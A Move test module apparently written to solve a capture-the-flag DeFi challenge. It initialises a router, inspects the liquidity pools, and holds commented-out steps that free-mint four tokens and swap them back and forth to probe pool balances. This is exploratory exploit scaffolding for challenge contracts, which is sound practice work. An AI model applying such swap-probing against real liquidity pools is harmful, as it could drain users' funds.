module challenge::test {
    use challenge::router;
    use challenge::pool::{Self, LiquidityPool};
    use aptos_framework::fungible_asset;
    use aptos_framework::primary_fungible_store;

    use aptos_framework::object::{Self, Object};
    use std::vector;
    use std::debug;
    
    // osec, movebit, zellic, jdz init to 1337
    #[test(account = @0x1338, challenger = @0xf75daa73fc071f93593335eb9033da804777eb94491650dd3f095ce6f778acb6)]
    public fun solve(account: &signer, challenger: &signer) {
        router::initialize(challenger);
        let pools = pool::all_pools();
        vector::remove<Object<LiquidityPool>>(&mut pools, 0);
        vector::remove<Object<LiquidityPool>>(&mut pools, 0);
        let pools2 = pool::all_pools();
        let length = vector::length<Object<LiquidityPool>>(&pools2);
        debug::print<u64>(&length);
        // let (osec_fa, movebit_fa, zellic_fa, jbz_fa) = router::free_mint(account);
        // let osec_metadata = fungible_asset::metadata_from_asset(&osec_fa);
        // let movebit_metadata = fungible_asset::metadata_from_asset(&movebit_fa);
        // let zellic_metadata = fungible_asset::metadata_from_asset(&zellic_fa);
        // let jbz_metadata = fungible_asset::metadata_from_asset(&jbz_fa);

        // let osec_amount = fungible_asset::amount(&osec_fa);
        // let movebit_amount = fungible_asset::amount(&movebit_fa);
        // let zellic_amount = fungible_asset::amount(&zellic_fa);
        // let jbz_amount = fungible_asset::amount(&jbz_fa);
        // debug::print<u64>(&osec_amount);
        // debug::print<u64>(&movebit_amount);
        // debug::print<u64>(&zellic_amount);
        // debug::print<u64>(&jbz_amount);

        

        // let ret = router::swap_a_2_b(osec_fa, movebit_metadata, false);
        // fungible_asset::merge(&mut ret, movebit_fa);
        // debug::print<u64>(&fungible_asset::amount(&ret));
        // ret = router::swap_b_2_a(osec_metadata, ret, false);
        // debug::print<u64>(&fungible_asset::amount(&ret));
        // primary_fungible_store::deposit(signer::address_of(account), ret);
        // let (balance1, balance2) = router::balance(osec_metadata, movebit_metadata, false);
        // debug::print<u64>(&balance1);
        // debug::print<u64>(&balance2);

        // // prevent drop exception
        // // primary_fungible_store::deposit(signer::address_of(account), osec_fa);
        // // primary_fungible_store::deposit(signer::address_of(account), movebit_fa);
        // primary_fungible_store::deposit(signer::address_of(account), zellic_fa);
        // primary_fungible_store::deposit(signer::address_of(account), jbz_fa);
    }
}
